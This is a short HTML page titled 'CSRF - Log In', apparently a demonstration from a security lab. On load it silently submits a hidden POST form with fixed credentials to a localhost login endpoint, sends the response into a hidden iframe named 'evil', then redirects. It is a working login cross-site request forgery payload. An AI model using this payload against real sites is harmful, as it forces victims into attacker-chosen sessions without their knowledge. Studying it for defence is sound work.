<html lang="en" xmlns:th="http://www.thymeleaf.org">
<head>
    <title>CSRF - Log In</title>
    <script type="text/javascript">
        function csrf() {
            document.getElementById('csrf').submit();
            setTimeout(function(){ window.location.replace('http://localhost:8080/') }, 1000);
        }
    </script>
</head>
<body onload="csrf()">
    <form id="csrf" action="http://localhost:8080/login" method="post" target="evil" id="evil">
        <input type="hidden" name="username" value="use1"/>
        <input type="hidden" name="password" value="password" />
    </form>
    <iframe style="display:none" name="evil"></iframe>
</body>
</html>
